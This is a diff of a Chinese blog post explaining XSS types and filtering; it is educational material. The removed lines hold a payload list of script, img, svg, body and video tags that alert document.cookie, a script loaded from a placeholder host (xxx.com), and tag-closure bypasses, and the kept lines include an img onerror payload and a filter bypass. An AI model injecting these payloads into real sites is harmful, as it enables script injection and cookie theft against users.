@@ -2,37 +2,37 @@
 <html lang="zh-cn">
     <head><meta charset='utf-8'>
 <meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='参考原文：XSS(跨站脚本攻击)详解 @615 
- 1.简单介绍 HTML注入与XSS攻击简单来说就是当用户在输入框输入内容，后台对输入内容不做处理直接添加入页面。此时，用户就可以刻意填写HTML、JavaScript脚本来作为文本输入，这样这个页面就会出现一些用户加入的东西了，这是一种脚本注入。
-&amp;lt;a href=http://www.baidu.com&amp;gt;Click Me&amp;lt;/a&amp;gt; 当然有些稍微有点脑子的网站会屏蔽 script 标签的输入，但是我们大可以利用类似于以下的语句注入脚本。
-&amp;lt;img src=1 οnerrοr=alert(1) /&amp;gt; &amp;lt;scr&amp;lt;script&amp;gt;ipt&amp;gt; 因此，相比起过滤script标签，建议采用更加高明的过滤&#39;&amp;lt;&#39;&#39;&amp;gt;&#39;&#39;&amp;amp;&amp;lsquo;等符号。事实上html定义了几个特定符号专门用来表示这几个符号的，比如用&amp;amp;amp来代替&amp;amp;符号等。
-2.XSS 跨站脚本攻击XSS(Cross Site Scripting)，为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。XSS攻击针对的是用户层面的攻击！
-XSS攻击主要分为以下三种
- 存储型XSS：存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie 反射型XSS：非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。反射型XSS大多数是用来盗取用户的Cookie信息 DOM型XSS：不经过后端，DOM-XSS漏洞是基于文档对象模型(Document Objeet Model,DOM)的一种漏洞，DOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。可能触发DOM型XSS的属性有：document.referer，window.name，location，innerHTML，documen.write。具体操作是在URL中传入参数的值，然后客户端页面通过js脚本利用DOM的方法获得URL中参数的值，再通过DOM方法进行赋值或其他操作  3.XSS的攻击载荷 以下所有标签的 &amp;gt; 都可以用 // 代替
-script标签 &amp;lt;script&amp;gt;alert(&amp;#34;hack&amp;#34;)&amp;lt;/script&amp;gt; #弹出hack &amp;lt;script&amp;gt;alert(/hack/)&amp;lt;/script&amp;gt; #弹出hack &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; #弹出1，对于数字可以不用引号 &amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt; #弹出cookie &amp;lt;script src=http://xxx.com/xss.js&amp;gt;&amp;lt;/script&amp;gt; #引用外部的xss svg标签 &amp;lt;svg onload=&amp;#34;alert(1)&amp;#34;&amp;gt; &amp;lt;svg onload=&amp;#34;alert(1)&amp;#34;// img标签 &amp;lt;img src=1 οnerrοr=alert(&amp;#34;hack&amp;#34;)&amp;gt; &amp;lt;img src=1 οnerrοr=alert(document.cookie)&amp;gt; #弹出cookie body标签 &amp;lt;body οnlοad=alert(1)&amp;gt; &amp;lt;body οnpageshοw=alert(1)&amp;gt; video标签 &amp;lt;video οnlοadstart=alert(1) src=&amp;#34;/media/hack-the-planet.'><title>随记—什么是 XSS</title>
+ 1.简单介绍 HTML 注入与 XSS 攻击简单来说就是当用户在输入框输入内容时，后台对输入内容不做处理就直接添加入页面。此时，用户可以刻意填写 HTML、JavaScript 脚本来作为文本输入，这样这个页面就会出现一些用户加入的东西了。比如用户输入以下内容：
+&amp;lt;a href=http://www.baidu.com&amp;gt;Click Me&amp;lt;/a&amp;gt;当后台将该内容直接展示时，就会在前台展示出一个跳转至百度的链接。因此网站需要对用户的输入进行过滤，以避免该问题的出现。
+为了避免这些问题，网站通常都会屏蔽 script 标签的输入，但这并不严谨，用户还可以利用类似于以下的语句来实现注入。
+&amp;lt;img src=1 οnerrοr=alert(1)/&amp;gt;&amp;lt;scr&amp;lt;script&amp;gt;ipt&amp;gt;因此，相比起过滤 script 标签，更建议过滤 &amp;lt;, &amp;gt;, &amp;amp;等符号。
+2.XSS 跨站脚本攻击 XSS ( Cross Site Scripting )，为了不和层叠样式表 ( Cascading Style Sheets，CSS ) 的缩写混淆，所以将跨站脚本攻击缩写为 XSS。恶意攻击者往往会在 Web 页面里插入恶意 JavaScript 代码，当用户浏览该页面时，嵌入 Web 里面的 JavaScript 代码会被执行，从而达到恶意攻击用户的目的。
+XSS 攻击主要分为以下三种
+ 存储型 XSS：持久化的攻击。如果恶意攻击者在个人信息或发表文章等地方，插入代码，后端又没有过滤或过滤不严，那么这些代码就会被储存到服务器中，其他任何用户访问该页面时都会触发代码执行。 反射型 XSS：非持久化的攻击。需要欺骗用户自己去点击链接才能触发 XSS 代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。 DOM 型 XSS：不经过后端的攻击。DOM-XSS 漏洞是基于文档对象模型 ( Document Objeet Model，DOM ) 的一种漏洞，DOM-XSS 是通过 URL 传入参数去控制触发的。可能触发 DOM 型 XSS 的属性有：document.'><title>随记—什么是 XSS</title>
 
 <link rel='canonical' href='https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E4%BB%80%E4%B9%88%E6%98%AF-xss/'>
 
 <link rel="stylesheet" href="/scss/style.min.fa98bf14afdac09951c5b3f15d691ead49c9487b98b0a744d758d7966dd96652.css"><meta property='og:title' content='随记—什么是 XSS'>
 <meta property='og:description' content='参考原文：XSS(跨站脚本攻击)详解 @615 
- 1.简单介绍 HTML注入与XSS攻击简单来说就是当用户在输入框输入内容，后台对输入内容不做处理直接添加入页面。此时，用户就可以刻意填写HTML、JavaScript脚本来作为文本输入，这样这个页面就会出现一些用户加入的东西了，这是一种脚本注入。
-&amp;lt;a href=http://www.baidu.com&amp;gt;Click Me&amp;lt;/a&amp;gt; 当然有些稍微有点脑子的网站会屏蔽 script 标签的输入，但是我们大可以利用类似于以下的语句注入脚本。
-&amp;lt;img src=1 οnerrοr=alert(1) /&amp;gt; &amp;lt;scr&amp;lt;script&amp;gt;ipt&amp;gt; 因此，相比起过滤script标签，建议采用更加高明的过滤&#39;&amp;lt;&#39;&#39;&amp;gt;&#39;&#39;&amp;amp;&amp;lsquo;等符号。事实上html定义了几个特定符号专门用来表示这几个符号的，比如用&amp;amp;amp来代替&amp;amp;符号等。
-2.XSS 跨站脚本攻击XSS(Cross Site Scripting)，为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。XSS攻击针对的是用户层面的攻击！
-XSS攻击主要分为以下三种
- 存储型XSS：存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie 反射型XSS：非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。反射型XSS大多数是用来盗取用户的Cookie信息 DOM型XSS：不经过后端，DOM-XSS漏洞是基于文档对象模型(Document Objeet Model,DOM)的一种漏洞，DOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。可能触发DOM型XSS的属性有：document.referer，window.name，location，innerHTML，documen.write。具体操作是在URL中传入参数的值，然后客户端页面通过js脚本利用DOM的方法获得URL中参数的值，再通过DOM方法进行赋值或其他操作  3.XSS的攻击载荷 以下所有标签的 &amp;gt; 都可以用 // 代替
-script标签 &amp;lt;script&amp;gt;alert(&amp;#34;hack&amp;#34;)&amp;lt;/script&amp;gt; #弹出hack &amp;lt;script&amp;gt;alert(/hack/)&amp;lt;/script&amp;gt; #弹出hack &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; #弹出1，对于数字可以不用引号 &amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt; #弹出cookie &amp;lt;script src=http://xxx.com/xss.js&amp;gt;&amp;lt;/script&amp;gt; #引用外部的xss svg标签 &amp;lt;svg onload=&amp;#34;alert(1)&amp;#34;&amp;gt; &amp;lt;svg onload=&amp;#34;alert(1)&amp;#34;// img标签 &amp;lt;img src=1 οnerrοr=alert(&amp;#34;hack&amp;#34;)&amp;gt; &amp;lt;img src=1 οnerrοr=alert(document.cookie)&amp;gt; #弹出cookie body标签 &amp;lt;body οnlοad=alert(1)&amp;gt; &amp;lt;body οnpageshοw=alert(1)&amp;gt; video标签 &amp;lt;video οnlοadstart=alert(1) src=&amp;#34;/media/hack-the-planet.'>
+ 1.简单介绍 HTML 注入与 XSS 攻击简单来说就是当用户在输入框输入内容时，后台对输入内容不做处理就直接添加入页面。此时，用户可以刻意填写 HTML、JavaScript 脚本来作为文本输入，这样这个页面就会出现一些用户加入的东西了。比如用户输入以下内容：
+&amp;lt;a href=http://www.baidu.com&amp;gt;Click Me&amp;lt;/a&amp;gt;当后台将该内容直接展示时，就会在前台展示出一个跳转至百度的链接。因此网站需要对用户的输入进行过滤，以避免该问题的出现。
+为了避免这些问题，网站通常都会屏蔽 script 标签的输入，但这并不严谨，用户还可以利用类似于以下的语句来实现注入。
+&amp;lt;img src=1 οnerrοr=alert(1)/&amp;gt;&amp;lt;scr&amp;lt;script&amp;gt;ipt&amp;gt;因此，相比起过滤 script 标签，更建议过滤 &amp;lt;, &amp;gt;, &amp;amp;等符号。
+2.XSS 跨站脚本攻击 XSS ( Cross Site Scripting )，为了不和层叠样式表 ( Cascading Style Sheets，CSS ) 的缩写混淆，所以将跨站脚本攻击缩写为 XSS。恶意攻击者往往会在 Web 页面里插入恶意 JavaScript 代码，当用户浏览该页面时，嵌入 Web 里面的 JavaScript 代码会被执行，从而达到恶意攻击用户的目的。
+XSS 攻击主要分为以下三种
+ 存储型 XSS：持久化的攻击。如果恶意攻击者在个人信息或发表文章等地方，插入代码，后端又没有过滤或过滤不严，那么这些代码就会被储存到服务器中，其他任何用户访问该页面时都会触发代码执行。 反射型 XSS：非持久化的攻击。需要欺骗用户自己去点击链接才能触发 XSS 代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。 DOM 型 XSS：不经过后端的攻击。DOM-XSS 漏洞是基于文档对象模型 ( Document Objeet Model，DOM ) 的一种漏洞，DOM-XSS 是通过 URL 传入参数去控制触发的。可能触发 DOM 型 XSS 的属性有：document.'>
 <meta property='og:url' content='https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E4%BB%80%E4%B9%88%E6%98%AF-xss/'>
 <meta property='og:site_name' content='AC-LM &#39;s blog'>
 <meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:tag' content='随记' /><meta property='article:published_time' content='2021-03-30T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2021-03-30T00:00:00&#43;00:00'/>
 <meta name="twitter:title" content="随记—什么是 XSS">
 <meta name="twitter:description" content="参考原文：XSS(跨站脚本攻击)详解 @615 
- 1.简单介绍 HTML注入与XSS攻击简单来说就是当用户在输入框输入内容，后台对输入内容不做处理直接添加入页面。此时，用户就可以刻意填写HTML、JavaScript脚本来作为文本输入，这样这个页面就会出现一些用户加入的东西了，这是一种脚本注入。
-&amp;lt;a href=http://www.baidu.com&amp;gt;Click Me&amp;lt;/a&amp;gt; 当然有些稍微有点脑子的网站会屏蔽 script 标签的输入，但是我们大可以利用类似于以下的语句注入脚本。
-&amp;lt;img src=1 οnerrοr=alert(1) /&amp;gt; &amp;lt;scr&amp;lt;script&amp;gt;ipt&amp;gt; 因此，相比起过滤script标签，建议采用更加高明的过滤&#39;&amp;lt;&#39;&#39;&amp;gt;&#39;&#39;&amp;amp;&amp;lsquo;等符号。事实上html定义了几个特定符号专门用来表示这几个符号的，比如用&amp;amp;amp来代替&amp;amp;符号等。
-2.XSS 跨站脚本攻击XSS(Cross Site Scripting)，为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。XSS攻击针对的是用户层面的攻击！
-XSS攻击主要分为以下三种
- 存储型XSS：存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie 反射型XSS：非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。反射型XSS大多数是用来盗取用户的Cookie信息 DOM型XSS：不经过后端，DOM-XSS漏洞是基于文档对象模型(Document Objeet Model,DOM)的一种漏洞，DOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。可能触发DOM型XSS的属性有：document.referer，window.name，location，innerHTML，documen.write。具体操作是在URL中传入参数的值，然后客户端页面通过js脚本利用DOM的方法获得URL中参数的值，再通过DOM方法进行赋值或其他操作  3.XSS的攻击载荷 以下所有标签的 &amp;gt; 都可以用 // 代替
-script标签 &amp;lt;script&amp;gt;alert(&amp;#34;hack&amp;#34;)&amp;lt;/script&amp;gt; #弹出hack &amp;lt;script&amp;gt;alert(/hack/)&amp;lt;/script&amp;gt; #弹出hack &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; #弹出1，对于数字可以不用引号 &amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt; #弹出cookie &amp;lt;script src=http://xxx.com/xss.js&amp;gt;&amp;lt;/script&amp;gt; #引用外部的xss svg标签 &amp;lt;svg onload=&amp;#34;alert(1)&amp;#34;&amp;gt; &amp;lt;svg onload=&amp;#34;alert(1)&amp;#34;// img标签 &amp;lt;img src=1 οnerrοr=alert(&amp;#34;hack&amp;#34;)&amp;gt; &amp;lt;img src=1 οnerrοr=alert(document.cookie)&amp;gt; #弹出cookie body标签 &amp;lt;body οnlοad=alert(1)&amp;gt; &amp;lt;body οnpageshοw=alert(1)&amp;gt; video标签 &amp;lt;video οnlοadstart=alert(1) src=&amp;#34;/media/hack-the-planet.">
+ 1.简单介绍 HTML 注入与 XSS 攻击简单来说就是当用户在输入框输入内容时，后台对输入内容不做处理就直接添加入页面。此时，用户可以刻意填写 HTML、JavaScript 脚本来作为文本输入，这样这个页面就会出现一些用户加入的东西了。比如用户输入以下内容：
+&amp;lt;a href=http://www.baidu.com&amp;gt;Click Me&amp;lt;/a&amp;gt;当后台将该内容直接展示时，就会在前台展示出一个跳转至百度的链接。因此网站需要对用户的输入进行过滤，以避免该问题的出现。
+为了避免这些问题，网站通常都会屏蔽 script 标签的输入，但这并不严谨，用户还可以利用类似于以下的语句来实现注入。
+&amp;lt;img src=1 οnerrοr=alert(1)/&amp;gt;&amp;lt;scr&amp;lt;script&amp;gt;ipt&amp;gt;因此，相比起过滤 script 标签，更建议过滤 &amp;lt;, &amp;gt;, &amp;amp;等符号。
+2.XSS 跨站脚本攻击 XSS ( Cross Site Scripting )，为了不和层叠样式表 ( Cascading Style Sheets，CSS ) 的缩写混淆，所以将跨站脚本攻击缩写为 XSS。恶意攻击者往往会在 Web 页面里插入恶意 JavaScript 代码，当用户浏览该页面时，嵌入 Web 里面的 JavaScript 代码会被执行，从而达到恶意攻击用户的目的。
+XSS 攻击主要分为以下三种
+ 存储型 XSS：持久化的攻击。如果恶意攻击者在个人信息或发表文章等地方，插入代码，后端又没有过滤或过滤不严，那么这些代码就会被储存到服务器中，其他任何用户访问该页面时都会触发代码执行。 反射型 XSS：非持久化的攻击。需要欺骗用户自己去点击链接才能触发 XSS 代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。 DOM 型 XSS：不经过后端的攻击。DOM-XSS 漏洞是基于文档对象模型 ( Document Objeet Model，DOM ) 的一种漏洞，DOM-XSS 是通过 URL 传入参数去控制触发的。可能触发 DOM 型 XSS 的属性有：document.">
     <link rel="shortcut icon" href="/images/Infinite.png" />
 
     </head>
@@ -232,66 +232,42 @@ script标签 &amp;lt;script&amp;gt;alert(&amp;#34;hack&amp;#34;)&amp;lt;/script&
     > XSS(跨站脚本攻击)详解  @615 </a></p>
 </blockquote>
 <h2 id="1简单介绍">1.简单介绍</h2>
-<p>HTML注入与XSS攻击简单来说就是当用户在输入框输入内容，后台对输入内容不做处理直接添加入页面。此时，<strong>用户就可以刻意填写HTML、JavaScript脚本来作为文本输入</strong>，这样这个页面就会出现一些用户加入的东西了，这是一种脚本注入。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">http://www.baidu.com</span>&gt;Click Me&lt;/<span style="color:#f92672">a</span>&gt;
-</code></pre></div><p>当然有些稍微有点脑子的网站会屏蔽 script 标签的输入，但是我们大可以利用类似于以下的语句注入脚本。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">1</span> <span style="color:#a6e22e">οnerrοr</span><span style="color:#f92672">=</span><span style="color:#e6db74">alert(1)</span> /&gt;
-&lt;<span style="color:#f92672">scr</span><span style="color:#960050;background-color:#1e0010">&lt;</span><span style="color:#a6e22e">script</span>&gt;ipt&gt;
-</code></pre></div><p>因此，相比起过滤script标签，建议采用更加高明的过滤'&lt;''&gt;''&amp;&lsquo;等符号。事实上html定义了几个特定符号专门用来表示这几个符号的，比如用&amp;amp来代替&amp;符号等。</p>
+<p>HTML 注入与 XSS 攻击简单来说就是当用户在输入框输入内容时，后台对输入内容不做处理就直接添加入页面。此时，<strong>用户可以刻意填写 HTML、JavaScript 脚本来作为文本输入</strong>，这样这个页面就会出现一些用户加入的东西了。比如用户输入以下内容：</p>
+<pre tabindex="0"><code>&lt;a href=http://www.baidu.com&gt;Click Me&lt;/a&gt;
+</code></pre><p>当后台将该内容直接展示时，就会在前台展示出一个跳转至百度的链接。因此网站需要对用户的输入进行过滤，以避免该问题的出现。</p>
+<p>为了避免这些问题，网站通常都会屏蔽 script 标签的输入，但这并不严谨，用户还可以利用类似于以下的语句来实现注入。</p>
+<pre tabindex="0"><code>&lt;img src=1 οnerrοr=alert(1)/&gt;
+&lt;scr&lt;script&gt;ipt&gt;
+</code></pre><p>因此，相比起过滤 script 标签，更建议过滤 <code>&lt;, &gt;, &amp;</code>等符号。</p>
 <h2 id="2xss">2.XSS</h2>
-<p>跨站脚本攻击XSS(Cross Site Scripting)，为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。XSS攻击针对的是用户层面的攻击！</p>
-<p>XSS攻击主要分为以下三种</p>
+<p>跨站脚本攻击 XSS ( Cross Site Scripting )，为了不和层叠样式表 ( Cascading Style Sheets，CSS ) 的缩写混淆，所以将跨站脚本攻击缩写为 XSS。恶意攻击者往往会在 Web 页面里插入恶意 JavaScript 代码，当用户浏览该页面时，嵌入 Web 里面的 JavaScript 代码会被执行，从而达到恶意攻击用户的目的。</p>
+<p>XSS 攻击主要分为以下三种</p>
 <ul>
-<li>存储型XSS：存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie</li>
-<li>反射型XSS：非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。反射型XSS大多数是用来盗取用户的Cookie信息</li>
-<li>DOM型XSS：不经过后端，DOM-XSS漏洞是基于文档对象模型(Document Objeet Model,DOM)的一种漏洞，DOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。可能触发DOM型XSS的属性有：document.referer，window.name，location，innerHTML，documen.write。具体操作是在URL中传入参数的值，然后客户端页面通过js脚本利用DOM的方法获得URL中参数的值，再通过DOM方法进行赋值或其他操作</li>
+<li>存储型 XSS：持久化的攻击。如果恶意攻击者在个人信息或发表文章等地方，插入代码，后端又没有过滤或过滤不严，那么这些代码就会被储存到服务器中，其他任何用户访问该页面时都会触发代码执行。</li>
+<li>反射型 XSS：非持久化的攻击。需要欺骗用户自己去点击链接才能触发 XSS 代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。</li>
+<li>DOM 型 XSS：不经过后端的攻击。DOM-XSS 漏洞是基于文档对象模型 ( Document Objeet Model，DOM ) 的一种漏洞，DOM-XSS 是通过 URL 传入参数去控制触发的。可能触发 DOM 型 XSS 的属性有：document.referer，window.name，location，innerHTML，documen.write。具体操作是在 URL 中传入参数的值，然后客户端页面通过 JavaScript 脚本利用 DOM 的方法获得 URL 中参数的值，再通过 DOM 方法进行赋值或其他操作。</li>
 </ul>
-<h2 id="3xss的攻击载荷">3.XSS的攻击载荷</h2>
-<p>以下所有标签的 &gt; 都可以用 // 代替</p>
-<h3 id="script标签">script标签</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#34;hack&#34;</span>)&lt;/<span style="color:#f92672">script</span>&gt;   #弹出hack
-&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">/hack/</span>)&lt;/<span style="color:#f92672">script</span>&gt;   #弹出hack
-&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>)&lt;/<span style="color:#f92672">script</span>&gt;        #弹出1，对于数字可以不用引号
-&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(document.<span style="color:#a6e22e">cookie</span>)&lt;/<span style="color:#f92672">script</span>&gt;      #弹出cookie
-&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">http://xxx.com/xss.js</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;  #引用外部的xss
-</code></pre></div><h3 id="svg标签">svg标签</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">svg</span> <span style="color:#a6e22e">onload</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;alert(1)&#34;</span>&gt;
-&lt;<span style="color:#f92672">svg</span> <span style="color:#a6e22e">onload</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;alert(1)&#34;</span><span style="color:#960050;background-color:#1e0010">//</span>
-</code></pre></div><h3 id="img标签">img标签</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">img</span>  <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">1</span>  <span style="color:#a6e22e">οnerrοr</span><span style="color:#f92672">=</span><span style="color:#e6db74">alert(&#34;hack&#34;)</span>&gt;
-&lt;<span style="color:#f92672">img</span>  <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">1</span>  <span style="color:#a6e22e">οnerrοr</span><span style="color:#f92672">=</span><span style="color:#e6db74">alert(document.cookie)</span>&gt;  #弹出cookie
-</code></pre></div><h3 id="body标签">body标签</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">body</span> <span style="color:#a6e22e">οnlοad</span><span style="color:#f92672">=</span><span style="color:#e6db74">alert(1)</span>&gt;
-&lt;<span style="color:#f92672">body</span> <span style="color:#a6e22e">οnpageshοw</span><span style="color:#f92672">=</span><span style="color:#e6db74">alert(1)</span>&gt;
-</code></pre></div><h3 id="video标签">video标签</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">video</span> <span style="color:#a6e22e">οnlοadstart</span><span style="color:#f92672">=</span><span style="color:#e6db74">alert(1)</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/media/hack-the-planet.mp4&#34;</span> /&gt;
-</code></pre></div><h3 id="style标签">style标签</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">style</span> <span style="color:#a6e22e">οnlοad</span><span style="color:#f92672">=</span><span style="color:#e6db74">alert(1)</span>&gt;&lt;/<span style="color:#f92672">style</span>&gt;
-</code></pre></div><h2 id="4xss可以插在哪里">4.XSS可以插在哪里？</h2>
-<ul>
-<li>用户输入作为script标签内容</li>
-<li>用户输入作为HTML注释内容</li>
-<li>用户输入作为HTML标签的属性名</li>
-<li>用户输入作为HTML标签的属性值</li>
-<li>用户输入作为HTML标签的名字</li>
-<li>直接插入到CSS里</li>
-<li>最重要的是，千万不要引入任何不可信的第三方JavaScript到页面里！</li>
-</ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#75715e">&lt;!-- 用户输入作为HTML注释内容，导致攻击者可以进行闭合绕过--&gt;</span>
-<span style="color:#75715e">&lt;!-- --&gt;</span>&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;hack&#39;</span>)&lt;/<span style="color:#f92672">script</span>&gt;<span style="color:#75715e">&lt;!-- --&gt;</span>
-<span style="color:#75715e">&lt;!-- 用户输入作为标签属性名，导致攻击者可以进行闭合绕过--&gt;</span>
-&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">用户输入</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;xx&#34;</span>&gt;  &lt;/<span style="color:#f92672">div</span>&gt;
-&lt;<span style="color:#f92672">div</span> &gt;&lt;/<span style="color:#f92672">div</span>&gt;&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;hack&#39;</span>)&lt;/<span style="color:#f92672">script</span>&gt;&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">a</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;xx&#34;</span>&gt; &lt;/<span style="color:#f92672">div</span>&gt;
-<span style="color:#75715e">&lt;!-- 用户输入作为标签属性值，导致攻击者可以进行闭合绕过--&gt;</span>
-&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;用户输入&#34;</span>&gt;&lt;/<span style="color:#f92672">div</span>&gt;
-&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>&gt;&lt;/<span style="color:#f92672">div</span>&gt;&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;hack&#39;</span>)&lt;/<span style="color:#f92672">script</span>&gt;&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">a</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;x&#34;</span>&gt;&lt;/<span style="color:#f92672">div</span>&gt;
-<span style="color:#75715e">&lt;!-- 用户输入作为标签名，导致攻击者可以进行闭合绕过--&gt;</span>
-&lt;<span style="color:#f92672">用户输入</span>  <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;xx&#34;</span> /&gt;
-<span style="color:#960050;background-color:#1e0010">&lt;</span>&gt;&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;hack&#39;</span>)&lt;/<span style="color:#f92672">script</span>&gt;&lt;<span style="color:#f92672">b</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;xx&#34;</span> /&gt;
-<span style="color:#75715e">&lt;!-- 用户输入作为CSS内容，导致攻击者可以进行闭合绕过--&gt;</span>
-&lt;<span style="color:#f92672">style</span>&gt;<span style="color:#f92672">用户输入</span><span style="color:#f92672">&lt;</span><span style="color:#f92672">style</span><span style="color:#f92672">&gt;</span>
-<span style="color:#f92672">&lt;</span><span style="color:#f92672">style</span><span style="color:#f92672">&gt;</span> &lt;/<span style="color:#f92672">style</span>&gt;&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;hack&#39;</span>)&lt;/<span style="color:#f92672">script</span>&gt;&lt;<span style="color:#f92672">style</span>&gt; &lt;/<span style="color:#f92672">style</span>&gt;
